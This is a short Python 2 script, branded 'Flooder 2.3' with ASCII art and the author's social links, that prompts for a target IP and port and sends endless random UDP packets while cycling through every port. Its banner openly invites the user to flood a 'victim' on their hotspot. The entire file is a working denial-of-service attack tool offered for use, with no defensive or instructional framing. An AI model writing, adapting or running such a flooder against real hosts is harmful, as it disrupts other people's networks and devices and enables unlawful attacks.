
import socket, os, random, time

# Color
B = '\033[1m'
R = '\033[31m'
N = '\033[0m'

# Code time ##################
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
##############################

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
print B+"@@@@@@@@ @@@      @@@@@@@@   @@@@@@@@  @@@@@@@@"
print "@@@@@@@@ @@@     @@@@@@@@@@ @@@@@@@@@@ @@@   @@@@"
print "@@!      @@!     @@!   @@@@ @@!   @@@@ @@!     @@@"
print "!@!      !@!     !@!  @!@!@ !@!  @!@!@ !@!      @!@"
print "@!!!:!   @!!     @!@ @! !@! @!@ @! !@! @!@      !@!"
print "!!!!!:   !!!     !@!!!  !!! !@!!!  !!! !@!      !!!"
print "!!:      !!:     !!:!   !!! !!:!   !!! !!:      !!!"
print ":!:      :!:     :!:    !:! :!:    !:! :!:     !:!"
print ":::      ::::::: :::::::::: :::::::::: ;::    :::"
print ":::      :::::::  ::::::::   ::::::::  :::::::::"+N
print "["+B+""+R+"#"+N+"] "+B+""+R+"Modified by Salik"+N+"   Flooder 2.3 - "+B+""+R+"Salick.gq"+N
print
print "[] www.instagram.com/saaalick []"
print "#Now flood your victim,who connects your Hotspot without your permission."

print
ip = raw_input(' Target IP: ')
port = input(' Port: ')
os.system("clear")
print "Flood attack started on {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year)
time.sleep(3)
print
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
